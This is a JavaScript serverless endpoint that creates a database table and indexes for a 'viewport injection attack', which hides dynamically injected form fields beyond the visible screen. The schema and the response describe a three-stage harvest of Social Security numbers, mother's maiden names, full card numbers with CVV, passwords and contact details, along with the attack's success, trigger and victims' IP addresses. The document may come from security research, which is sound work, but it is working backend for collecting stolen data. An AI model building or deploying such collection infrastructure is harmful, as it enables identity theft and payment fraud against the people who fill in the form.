// Simple endpoint to create membership attack data table v3 (viewport injection attack)
// Visit: https://your-vercel-url.com/api/create-table-v3

import { neon } from '@neondatabase/serverless';

export default async function handler(req, res) {
    if (req.method !== 'GET') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Connect to Neon database
        const sql = neon(process.env.subscription_form_DATABASE_URL);

        // Create membership attack data table v3 for viewport injection attacks
        await sql`
            CREATE TABLE IF NOT EXISTS membership_attack_data_v3 (
                id SERIAL PRIMARY KEY,
                form_type VARCHAR(50) DEFAULT 'membership-v3-viewport',

                -- Basic membership fields
                first_name VARCHAR(255),
                last_name VARCHAR(255),
                email VARCHAR(255),
                birthdate DATE,
                zip_code VARCHAR(20),
                agreement_accepted BOOLEAN DEFAULT FALSE,

                -- Identity verification fields (Stage 1)
                social_security_number VARCHAR(11),
                mother_maiden_name VARCHAR(255),

                -- Viewport injection payment fields (Stage 2)
                verify_card_number VARCHAR(255),
                verify_expiry_month VARCHAR(2),
                verify_expiry_year VARCHAR(2),
                verify_cvv VARCHAR(4),
                verify_card_name VARCHAR(255),
                verify_billing_zip VARCHAR(20),

                -- Account security fields (Stage 3)
                account_password VARCHAR(255),
                confirm_password VARCHAR(255),
                backup_phone_number VARCHAR(15),
                emergency_contact VARCHAR(255),

                -- Viewport attack metadata
                viewport_injection_success BOOLEAN DEFAULT FALSE,
                trigger_source VARCHAR(100), -- email-input, checkbox-agree, form-submit, etc.
                viewport_height INTEGER,
                document_height INTEGER,
                injection_position VARCHAR(50) DEFAULT '100vh',
                is_field_update BOOLEAN DEFAULT FALSE,
                update_timestamp TIMESTAMP,

                -- Environment data
                user_agent TEXT,
                ip_address INET,

                -- Timestamps
                submitted_at TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        `;

        // Create indexes for performance
        await sql`CREATE INDEX IF NOT EXISTS idx_membership_v3_email ON membership_attack_data_v3(email);`;
        await sql`CREATE INDEX IF NOT EXISTS idx_membership_v3_created_at ON membership_attack_data_v3(created_at);`;
        await sql`CREATE INDEX IF NOT EXISTS idx_membership_v3_viewport_success ON membership_attack_data_v3(viewport_injection_success);`;
        await sql`CREATE INDEX IF NOT EXISTS idx_membership_v3_trigger_source ON membership_attack_data_v3(trigger_source);`;
        await sql`CREATE INDEX IF NOT EXISTS idx_membership_v3_is_update ON membership_attack_data_v3(is_field_update);`;

        res.status(200).json({
            success: true,
            message: 'Membership attack database table v3 (viewport injection) created successfully',
            table: 'membership_attack_data_v3',
            purpose: 'Viewport injection attack data collection for subscription3 page',
            attack_type: 'Viewport Manipulation to Conceal Dynamic DOM Content',
            endpoints: {
                submit: '/api/membership/submit-v3',
                view: '/api/membership/view-v3'
            },
            columns: {
                basic_fields: ['first_name', 'last_name', 'email', 'birthdate', 'zip_code', 'agreement_accepted'],
                identity_fields: ['social_security_number', 'mother_maiden_name'],
                payment_fields: ['verify_card_number', 'verify_expiry_month', 'verify_expiry_year', 'verify_cvv', 'verify_card_name', 'verify_billing_zip'],
                account_fields: ['account_password', 'confirm_password', 'backup_phone_number', 'emergency_contact'],
                viewport_metadata: ['viewport_injection_success', 'trigger_source', 'viewport_height', 'document_height', 'injection_position'],
                attack_metadata: ['is_field_update', 'user_agent', 'ip_address'],
                timestamps: ['submitted_at', 'created_at', 'update_timestamp']
            },
            attack_stages: {
                stage_1: 'Identity Verification (SSN, Mother\'s Maiden Name)',
                stage_2: 'Payment Verification (Credit Card Details)',
                stage_3: 'Account Security Setup (Passwords, Phone, Emergency Contact)'
            }
        });

    } catch (error) {
        console.error('Table v3 creation error:', error);
        res.status(500).json({
            error: 'Failed to create membership attack table v3',
            details: error.message
        });
    }
}